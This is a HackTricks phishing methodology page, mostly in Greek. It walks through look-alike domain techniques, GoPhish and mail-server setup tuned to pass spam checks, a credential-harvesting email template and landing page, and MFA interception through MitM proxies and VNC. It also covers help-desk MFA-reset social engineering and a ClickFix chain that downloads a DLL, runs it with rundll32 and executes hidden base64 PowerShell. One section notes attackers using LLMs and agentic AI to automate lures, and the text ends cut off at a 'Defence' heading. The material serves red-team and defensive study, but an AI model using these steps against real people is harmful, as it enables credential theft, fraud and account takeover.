# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Recon του θύματος
1. Επιλέξτε το **domain του θύματος**.
2. Εκτελέστε βασική αναζήτηση στον ιστό **σε αναζήτηση login portals** που χρησιμοποιεί το θύμα και **αποφασίστε** ποιο θα **παραστήσετε**.
3. Χρησιμοποιήστε κάποιο **OSINT** για να **βρείτε emails**.
2. Προετοιμάστε το περιβάλλον
1. **Αγοράστε το domain** που θα χρησιμοποιήσετε για την αξιολόγηση phishing
2. **Διαμορφώστε τις εγγραφές υπηρεσίας email** (SPF, DMARC, DKIM, rDNS)
3. Διαμορφώστε το VPS με **gophish**
3. Προετοιμάστε την καμπάνια
1. Προετοιμάστε το **email template**
2. Προετοιμάστε τη **web page** για να κλέψετε τα credentials
4. Εκκινήστε την καμπάνια!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Το domain περιέχει μια σημαντική **λέξη-κλειδί** του αρχικού domain (π.χ., zelster.com-management.com).
- **hypened subdomain**: Αλλάξτε την **τελεία σε παύλα** ενός subdomain (π.χ., www-zelster.com).
- **New TLD**: Ίδιο domain χρησιμοποιώντας **νέα TLD** (π.χ., zelster.org)
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain με **γράμματα που μοιάζουν** (π.χ., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Ανταλλάσσει **δύο γράμματα** μέσα στο domain (π.χ., zelsetr.com).
- **Singularization/Pluralization**: Προσθέτει ή αφαιρεί “s” στο τέλος του domain (π.χ., zeltsers.com).
- **Omission**: **Αφαιρεί** ένα από τα γράμματα του domain (π.χ., zelser.com).
- **Repetition:** **Επαναλαμβάνει** ένα από τα γράμματα στο domain (π.χ., zeltsser.com).
- **Replacement**: Όπως το homoglyph αλλά λιγότερο stealthy. Αντικαθιστά ένα γράμμα, πιθανώς με γράμμα κοντά στο αρχικό στο πληκτρολόγιο (π.χ., zektser.com).
- **Subdomained**: Εισάγει μια **τελεία** μέσα στο domain (π.χ., ze.lster.com).
- **Insertion**: **Εισάγει ένα γράμμα** στο domain (π.χ., zerltser.com).
- **Missing dot**: Προσαρτά το TLD στο domain. (π.χ., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει η **δυνατότητα ένα από τα bits που αποθηκεύονται ή μεταδίδονται να αναστραφεί αυτόματα** λόγω διαφόρων παραγόντων όπως ηλιακές καταιγίδες, κοσμικές ακτίνες ή σφάλματα hardware.

Όταν αυτή η έννοια **εφαρμόζεται σε DNS requests**, είναι πιθανό ότι το **domain που λαμβάνει ο DNS server** να μην είναι το ίδιο με το domain που αρχικά ζητήθηκε.

Για παράδειγμα, μια μονή τροποποίηση bit στο domain "windows.com" μπορεί να το αλλάξει σε "windnws.com."

Οι επιτιθέμενοι μπορεί να **εκμεταλλευτούν αυτό καταχωρίζοντας πολλαπλά bit-flipping domains** που μοιάζουν με το domain του θύματος. Σκοπός τους είναι να ανακατευθύνουν νόμιμους χρήστες στην υποδομή τους.

Για περισσότερες πληροφορίες διαβάστε [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Αγορά αξιόπιστου domain

Μπορείτε να κάνετε αναζήτηση στο [https://www.expireddomains.net/](https://www.expireddomains.net) για ένα expired domain που θα μπορούσατε να χρησιμοποιήσετε.\
Για να βεβαιωθείτε ότι το expired domain που πρόκειται να αγοράσετε **έχει ήδη καλό SEO** μπορείτε να ελέγξετε πώς είναι κατηγοριοποιημένο σε:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Εντοπισμός διευθύνσεων email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **εντοπίσετε περισσότερες** έγκυρες διευθύνσεις email ή να **επιβεβαιώσετε αυτές** που έχετε ήδη βρει, μπορείτε να δοκιμάσετε brute-force στους smtp servers του θύματος. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι αν οι χρήστες χρησιμοποιούν **κάποιο web portal για να έχουν πρόσβαση στα mail τους**, μπορείτε να ελέγξετε αν είναι ευάλωτο σε **username brute force** και να εκμεταλλευτείτε την ευπάθεια αν είναι δυνατό.

## Configuring GoPhish

### Εγκατάσταση

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
Θα σας δοθεί ένας κωδικός για τον admin χρήστη στην θύρα 3333 στην έξοδο. Συνεπώς, αποκτήστε πρόσβαση σε αυτή τη θύρα και χρησιμοποιήστε αυτά τα credentials για να αλλάξετε τον admin κωδικό. Ενδέχεται να χρειαστεί να κάνετε tunnel αυτής της θύρας στο local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Διαμόρφωση

**Διαμόρφωση πιστοποιητικού TLS**

Πριν από αυτό το βήμα θα πρέπει να **έχετε ήδη αγοράσει το domain** που πρόκειται να χρησιμοποιήσετε και πρέπει να **δείχνει** στην **IP του VPS** όπου διαμορφώνετε το **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Ρύθμιση Mail**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Στη συνέχεια προσθέστε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης τις τιμές των παρακάτω μεταβλητών μέσα στο /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος, τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** στο domain σας και **επανεκκινήστε το VPS σας.**

Τώρα, δημιουργήστε ένα **DNS A record** για το `mail.<domain>` που δείχνει στη **ip address** του VPS και ένα **DNS MX** record που δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Διαμόρφωση Gophish**

Σταματήστε την εκτέλεση του gophish και ας το διαμορφώσουμε.\ 
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Ρύθμιση υπηρεσίας gophish**

Για να δημιουργήσετε την υπηρεσία gophish ώστε να μπορεί να ξεκινά αυτόματα και να διαχειρίζεται ως υπηρεσία, μπορείτε να δημιουργήσετε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Ολοκληρώστε τη διαμόρφωση της υπηρεσίας και ελέγξτε τη λειτουργία της ως εξής:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuring mail server and domain

### Περίμενε & να είσαι νόμιμος

Όσο παλαιότερος είναι ένας domain τόσο λιγότερο πιθανό είναι να χαρακτηριστεί ως spam. Συνεπώς πρέπει να περιμένεις όσο γίνεται περισσότερο (τουλάχιστον 1 εβδομάδα) πριν την phishing αξιολόγηση. Επιπλέον, αν βάλεις μια σελίδα για έναν τομέα με καλή φήμη, η φήμη που θα αποκτηθεί θα είναι καλύτερη.

Σημείωσε ότι ακόμη και αν πρέπει να περιμένεις μία εβδομάδα, μπορείς να ολοκληρώσεις τώρα όλες τις ρυθμίσεις.

### Configure Reverse DNS (rDNS) record

Ρύθμισε μια rDNS (PTR) εγγραφή που επιλύει τη διεύθυνση IP του VPS στο όνομα τομέα.

### Sender Policy Framework (SPF) Record

Πρέπει να **διαμορφώσεις ένα SPF record για το νέο domain**. Αν δεν ξέρεις τι είναι ένα SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείς να χρησιμοποιήσεις [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσεις την SPF policy σου (χρησιμοποίησε την IP της μηχανής VPS)

![](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να εισαχθεί μέσα σε ένα TXT record στο domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Πιστοποίηση μηνυμάτων βάσει domain, Αναφορές & Συμμόρφωση (DMARC) Record

Πρέπει να **διαμορφώσετε ένα DMARC record για το νέο domain**. Αν δεν ξέρετε τι είναι ένα DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε μια νέα DNS TXT εγγραφή με hostname `_dmarc.<domain>` και το ακόλουθο περιεχόμενο:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **ρυθμίσετε ένα DKIM για το νέο domain**. Αν δεν ξέρετε τι είναι μια εγγραφή DMARC [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Πρέπει να ενώσετε και τις δύο τιμές B64 που παράγει το κλειδί DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Μπορείτε να το κάνετε χρησιμοποιώντας [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς προσπελάστε τη σελίδα και στείλτε ένα email στη διεύθυνση που θα σας δοθεί:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Μπορείτε επίσης να **ελέγξετε τη διαμόρφωση του email σας** στέλνοντας ένα email στο `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (για αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_ αν στείλετε το email ως root).\
Ελέγξτε ότι περνάτε όλα τα τεστ:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Μπορείτε επίσης να στείλετε **μήνυμα σε έναν λογαριασμό Gmail υπό τον έλεγχό σας**, και να ελέγξετε τις **κεφαλίδες του email** στα εισερχόμενά σας στο Gmail, το `dkim=pass` θα πρέπει να υπάρχει στο πεδίο κεφαλίδας `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Αφαίρεση από Spamhouse Blacklist

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σας δείξει αν το domain σας μπλοκάρεται από το spamhouse. Μπορείτε να ζητήσετε να αφαιρεθεί το domain/IP σας στο: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Αφαίρεση από το Microsoft Blacklist

Μπορείτε να ζητήσετε να αφαιρεθεί το domain/IP σας στο [https://sender.office.com/](https://sender.office.com).

## Δημιουργία & Εκκίνηση GoPhish Campaign

### Προφίλ Αποστολής

- Ορίστε ένα **όνομα για να αναγνωρίζετε** το προφίλ αποστολέα
- Αποφασίστε από ποιο λογαριασμό θα στείλετε τα phishing emails. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείτε να αφήσετε κενά το όνομα χρήστη και τον κωδικό, αλλά φροντίστε να επιλέξετε το Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσετε τη λειτουργία "**Send Test Email**" για να ελέγξετε ότι όλα λειτουργούν.\
> Συνιστώ να **στείλετε τα test emails σε 10min mails addresses** ώστε να αποφύγετε το να μπείτε σε blacklist κάνοντας δοκιμές.

### Πρότυπο Email

- Ορίστε ένα **όνομα για να αναγνωρίζετε** το πρότυπο
- Στη συνέχεια γράψτε ένα **θέμα** (τίποτα περίεργο, κάτι που θα περιμένατε να διαβάσετε σε ένα κανονικό email)
- Βεβαιωθείτε ότι έχετε τσεκάρει το "**Add Tracking Image**"
- Γράψτε το **πρότυπο email** (μπορείτε να χρησιμοποιήσετε μεταβλητές όπως στο παρακάτω παράδειγμα):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Σημειώστε ότι **για να αυξήσετε την αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε κάποια υπογραφή από ένα email του πελάτη. Προτάσεις:

- Στείλτε ένα email σε μια **ανύπαρκτη διεύθυνση** και ελέγξτε αν η απάντηση έχει κάποια υπογραφή.
- Αναζητήστε **δημόσια emails** όπως info@ex.com ή press@ex.com ή public@ex.com, στείλτε τους ένα email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με **κάποιο έγκυρο εντοπισμένο** email και περιμένετε την απάντηση

![](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επίσης επιτρέπει να **επισυνάψετε αρχεία για αποστολή**. Εάν θέλετε επίσης να κλέψετε NTLM challenges χρησιμοποιώντας κάποια ειδικά κατασκευασμένα αρχεία/έγγραφα [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Γράψτε ένα **όνομα**
- **Γράψτε τον HTML κώδικα** της ιστοσελίδας. Σημειώστε ότι μπορείτε να **εισαγάγετε** web pages.
- Επιλέξτε **Capture Submitted Data** και **Capture Passwords**
- Ορίστε μια **ανακατεύθυνση**

![](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον HTML κώδικα της σελίδας και να κάνετε κάποια τεστ τοπικά (ίσως χρησιμοποιώντας κάποιο Apache server) **μέχρι να μείνετε ικανοποιημένοι με τα αποτελέσματα.** Έπειτα, επικολλήστε εκείνον τον HTML κώδικα στο πεδίο.\
> Σημειώστε ότι αν χρειάζεστε να **χρησιμοποιήσετε κάποια static resources** για το HTML (ίσως κάποια CSS και JS) μπορείτε να τα αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και μετά να τα προσπελάσετε από _**/static/\<filename>**_

> [!TIP]
> Για την ανακατεύθυνση μπορείτε να **ανακατευθύνετε τους χρήστες στην νόμιμη κύρια σελίδα** του θύματος, ή να τους ανακατευθύνετε σε _/static/migration.html_ για παράδειγμα, να βάλετε κάποιο **spinning wheel (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και μετά να υποδείξετε ότι η διαδικασία ολοκληρώθηκε με επιτυχία**.

### Users & Groups

- Ορίστε ένα όνομα
- **Import the data** (σημειώστε ότι για να χρησιμοποιήσετε το template για το παράδειγμα χρειάζεστε το firstname, last name και email address κάθε χρήστη)

![](<../../images/image (163).png>)

### Campaign

Τέλος, δημιουργήστε μια campaign επιλέγοντας ένα όνομα, το email template, την landing page, το URL, το sending profile και την group. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα θύματα

Σημειώστε ότι το **Sending Profile επιτρέπει να στείλετε ένα test email για να δείτε πώς θα φαίνεται το τελικό phishing email**:

![](<../../images/image (192).png>)

> [!TIP]
> Θα πρότεινα να **στείλετε τα test emails σε 10min mails addresses** ώστε να αποφύγετε το ενδεχόμενο blacklisting κατά τα τεστ.

Μόλις όλα είναι έτοιμα, απλά ξεκινήστε την καμπάνια!

## Website Cloning

Αν για οποιονδήποτε λόγο θέλετε να κλωνοποιήσετε την ιστοσελίδα δείτε την παρακάτω σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Σε μερικές phishing αξιολογήσεις (κυρίως για Red Teams) μπορεί να θελήσετε επίσης να **στείλετε αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως ένα C2 ή ίσως απλώς κάτι που θα ενεργοποιήσει μια authentication).\
Δείτε την παρακάτω σελίδα για μερικά παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη καθώς ψεύδεστε μια πραγματική ιστοσελίδα και συλλέγετε τις πληροφορίες που εισάγει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν έβαλε τον σωστό κωδικό ή αν η εφαρμογή που μιμηθήκατε είναι ρυθμισμένη με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να πλαστοπροσωπήσετε τον εξαπατημένο χρήστη**.

Εδώ είναι χρήσιμα εργαλεία όπως [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena). Το εργαλείο αυτό θα σας επιτρέψει να δημιουργήσετε μια MitM επίθεση. Βασικά, η επίθεση δουλεύει ως εξής:

1. Εσείς **πλαστοπροσωπείτε τη φόρμα login** της πραγματικής σελίδας.
2. Ο χρήστης **στέλνει** τα **credentials** του στη ψεύτικη σελίδα σας και το εργαλείο τα προωθεί στην πραγματική σελίδα, **ελέγχοντας αν τα credentials δουλεύουν**.
3. Εάν ο λογαριασμός είναι ρυθμισμένος με **2FA**, η MitM σελίδα θα το ζητήσει και μόλις ο **χρήστης το εισάγει** το εργαλείο θα το στείλει στην πραγματική web σελίδα.
4. Μόλις ο χρήστης αυθεντικοποιηθεί, εσείς (ως attacker) θα έχετε **συλλέξει τα credentials, το 2FA, τα cookies και οποιαδήποτε πληροφορία** από κάθε αλληλεπίδραση όσο το εργαλείο πραγματοποιεί MitM.

### Via VNC

Τι γίνεται αν αντί να **στέλνετε το θύμα σε μια κακόβουλη σελίδα** με την ίδια εμφάνιση όπως η πρωτότυπη, τον στέλνετε σε μια **VNC session με browser συνδεδεμένο στην πραγματική σελίδα**; Θα μπορείτε να δείτε τι κάνει, να κλέψετε τον κωδικό, το MFA που χρησιμοποιείται, τα cookies...\
Μπορείτε να το κάνετε αυτό με [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Προφανώς ένας από τους καλύτερους τρόπους να ξέρετε αν σας έχουν ανακαλύψει είναι να **αναζητήσετε το domain σας μέσα σε blacklists**. Αν εμφανιστεί καταχωρημένο, κάπως το domain σας ανιχνεύθηκε ως ύποπτο.\
Ένας εύκολος τρόπος να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι να ξέρετε αν το θύμα **ψάχνει ενεργά για ύποπτη phishing δραστηριότητα** όπως εξηγείται στο:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε **να αγοράσετε ένα domain με πολύ παρόμοιο όνομα** με το domain του θύματος **και/ή να δημιουργήσετε ένα certificate** για ένα **subdomain** ενός domain που ελέγχετε εσείς **που περιέχει** την **λέξη-κλειδί** του domain του θύματος. Αν το **θύμα** πραγματοποιήσει οποιονδήποτε είδους **DNS ή HTTP interaction** με αυτά, θα ξέρετε ότι **ψάχνει ενεργά** για ύποπτα domains και θα χρειαστεί να είστε πολύ stealth.

### Evaluate the phishing

Χρησιμοποιήστε [**Phishious** ](https://github.com/Rices/Phishious) για να αξιολογήσετε αν το email σας θα καταλήξει στον φάκελο spam ή αν θα μπλοκαριστεί ή θα είναι επιτυχημένο.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Οι σύγχρονες ομάδες εισβολής ολοένα και περισσότερο παραλείπουν τα email lures εντελώς και **στοχεύουν απευθείας στη διαδικασία service-desk / identity-recovery** για να νικήσουν το MFA. Η επίθεση είναι πλήρως "living-off-the-land": μόλις ο χειριστής αποκτήσει έγκυρα credentials, μετακινεί τα privileges με ενσωματωμένα admin εργαλεία – δεν απαιτείται malware.

### Attack flow
1. Recon του θύματος
* Συλλογή προσωπικών & εταιρικών στοιχείων από LinkedIn, data breaches, public GitHub, κ.λπ.
* Εντοπισμός υψηλής αξίας ταυτοτήτων (executives, IT, finance) και καταγραφή της **ακριβούς διαδικασίας help-desk** για reset κωδικού / MFA.
2. Real-time social engineering
* Τηλεφωνικά, Teams ή chat στο help-desk, υποδυόμενος τον στόχο (συχνά με **spoofed caller-ID** ή **cloned voice**).
* Παροχή των προηγουμένως συλλεγμένων PII για να περάσετε την επαλήθευση βάσει γνώσης.
* Πείστε τον agent να **επανεκκινήσει το MFA secret** ή να πραγματοποιήσει **SIM-swap** σε έναν καταχωρημένο αριθμό κινητού.
3. Άμεσες ενέργειες μετά την πρόσβαση (≤60 min σε πραγματικά περιστατικά)
* Εγκαθίδρυση foothold μέσω οποιουδήποτε web SSO portal.
* Επεξεργασία/απογραφή AD / AzureAD με ενσωματωμένα εργαλεία (χωρίς να ρίχνονται δυαδικά):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement με **WMI**, **PsExec**, ή νόμιμους **RMM** agents που ήδη είναι whitelisted στο περιβάλλον.

### Detection & Mitigation
* Αντιμετωπίστε την διαδικασία help-desk identity recovery ως **privileged operation** – απαιτήστε step-up auth & έγκριση από manager.
* Αναπτύξτε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που ειδοποιούν για:
* Αλλαγή μεθόδου MFA + authentication από νέα συσκευή / γεωγραφική θέση.
* Άμεση ανύψωση του ίδιου principal (user-→-admin).
* Καταγράψτε τις κλήσεις στο help-desk και επιβάλετε **call-back σε ήδη καταχωρημένο αριθμό** πριν από οποιοδήποτε reset.
* Εφαρμόστε **Just-In-Time (JIT) / Privileged Access** ώστε οι πρόσφατα επαναρυθμισμένοι λογαριασμοί να **μην** κληρονομούν αυτόματα υψηλό-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Οι ομάδες commodity αντισταθμίζουν το κόστος των high-touch ops με μαζικές επιθέσεις που μετατρέπουν τις **μηχανές αναζήτησης & τα ad networks σε κανάλι παράδοσης**.

1. **SEO poisoning / malvertising** σπρώχνει ένα ψεύτικο αποτέλεσμα όπως `chromium-update[.]site` στην κορυφή των διαφημίσεων αναζήτησης.
2. Το θύμα κατεβάζει ένα μικρό **first-stage loader** (συχνά JS/HTA/ISO). Παραδείγματα που έχει δει η Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Ο loader εξάγει browser cookies + credential DBs, και μετά τραβάει ένα **silent loader** που αποφασίζει – *σε πραγματικό χρόνο* – αν θα αναπτύξει:
* RAT (π.χ. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & επιβάλετε **Advanced DNS / URL Filtering** τόσο για *search-ads* όσο και για e-mail.
* Περιορίστε την εγκατάσταση λογισμικού σε signed MSI / Store packages, απαγορεύστε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Monitor για child processes των browsers που ανοίγουν installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Εντοπίστε LOLBins που συχνά καταχρώνται από first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: κλωνοποιημένη ανακοίνωση εθνικού CERT με κουμπί **Update** που εμφανίζει βήμα-βήμα οδηγίες “fix”. Τα θύματα καλούνται να τρέξουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.
* Τυπική αλυσίδα batch που έχει παρατηρηθεί:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* Το `Invoke-WebRequest` ρίχνει το payload στο `%TEMP%`, ένα σύντομο sleep κρύβει το jitter του δικτύου, μετά το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL beaconάρει την ταυτότητα του host και pollingάρει το C2 κάθε λίγα λεπτά. Τα remote tasks φτάνουν ως **base64-encoded PowerShell** που εκτελείται κρυφά και με policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει τα tasks χωρίς να ενημερώνει το DLL) και κρύβει τα παράθυρα της κονσόλας. Κυνηγήστε για PowerShell children του `rundll32.exe` που χρησιμοποιούν `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` μαζί.
* Οι defenders μπορούν να ψάξουν για HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και για polling intervals ~5 λεπτών μετά το load του DLL.

---

## AI-Enhanced Phishing Operations
Οι επιτιθέμενοι πλέον αλυσιδώνουν **LLM & voice-clone APIs** για πλήρως εξατομικευμένα lures και διαδραστική επικοινωνία σε πραγματικό χρόνο.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Επίπεδο|Παράδειγμα χρήσης από τον επιτιθέμενο|
|Automation|Generate & send >100 k emails / SMS με τυχαία διατυπωμένα μηνύματα & tracking links.|
|Generative AI|Παράγει *one-off* emails που αναφέρονται σε δημόσιες M&A, inside jokes από social media; deep-fake CEO voice σε callback scam.|
|Agentic AI|Αυτοματοποιημένη εγγραφή domains, scraping open-source intel, σύνταξη επόμενων mails όταν ένα θύμα κλικάρει αλλά δεν υποβάλει credentials.|

**Defence:**
